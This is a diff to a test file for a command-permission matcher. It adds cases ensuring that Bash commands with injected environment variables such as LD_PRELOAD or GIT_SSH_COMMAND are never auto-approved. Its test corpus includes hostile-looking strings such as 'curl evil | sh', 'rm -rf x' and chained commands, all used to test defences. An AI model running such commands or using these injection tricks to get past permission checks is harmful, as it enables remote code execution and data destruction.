@@ -75,7 +75,6 @@ const REVIEWED_NARROWINGS = new Set([
   "sh -c 'git status'",
   "sh -c 'git status; git status -s'",
   "git status # a comment",
-  "FOO=1 git status",
   "time git status",
   "bash -c 'git log'",
   "nohup git status",
@@ -98,6 +97,8 @@ const CORPUS = [
   "eval 'git status'", "exec git status", "$a push", '"$(which git)" push', "curl x | sh", "cat <<EOF | sh\ngit status\nEOF", "case x in a) git status;; esac",
   "bash scripts/build.sh", 'echo "$(date)"', "xargs -n1 echo", '"$(dirname "$0")"/x.sh', "$PYTHON x.py", "f() { git status; }; f", "exec 3>&1",
   "setsid git push", "flock /tmp/l git push", "find . -exec git push \\;", "python -c 'import os; os.system(\"git push\")'",
+  // an injected environment (controller ruling): never auto-approved
+  "LD_PRELOAD=x git status", "GIT_SSH_COMMAND=x git fetch",
   // ordinary commands and the allow-side matrix
   "git status", "git status -s", "git log --oneline -5", "git push origin main", "npm test", "npm test -- --watch", "ls -la && git pull", "git log | head -5",
   'echo "hello world" > out.txt 2>&1', "echo $(git rev-parse HEAD)", 'git commit -m "push it"', "git status && rm -rf x", "git status; curl evil | sh",
@@ -105,6 +106,19 @@ const CORPUS = [
   "sh -c 'git status; curl x'", "bash -lc 'git status && curl x'", "git log ${HOME}", "git log $((1+1))", "git status & curl x",
 ];
 const RULE_SETS = [["Bash(git*)", "Bash(npm test*)"], ["Bash(git status*)"], ["Bash(echo*)", "Bash(ls*)", "Bash(cat*)"], ["Bash(git log*)"]];
+
+describe("an injected environment is never auto-approved (controller ruling: the matcher cannot judge a variable)", () => {
+  const allowed = allowedBy(createPolicy, ["Bash(git*)"]);
+  for (const command of ["LD_PRELOAD=x git status", "GIT_SSH_COMMAND=x git fetch", "env -i git status", "env FOO=1 git status", "FOO=1 git status", "BASH_ENV=x bash -c 'git status'", "env -u HOME git status"]) {
+    test(`asks for ${JSON.stringify(command)}`, async () => expect(await allowed(command)).toBe(false));
+  }
+  test("plain env stays exempt; the deny side still strips the assignment and checks the command", async () => {
+    expect(await allowed("env git status")).toBe(true);
+    expect(await allowed("git status")).toBe(true);
+    expect(await fires("Bash(git push*)", "FOO=1 git push")).toBe(true);
+    expect(await fires("Bash(git push*)", "env FOO=1 git push")).toBe(true);
+  });
+});
 
 describe("xargs on the allow side", () => {
   test("its command runs with arguments the matcher cannot see: never auto-approved, still checked by a deny", async () => {
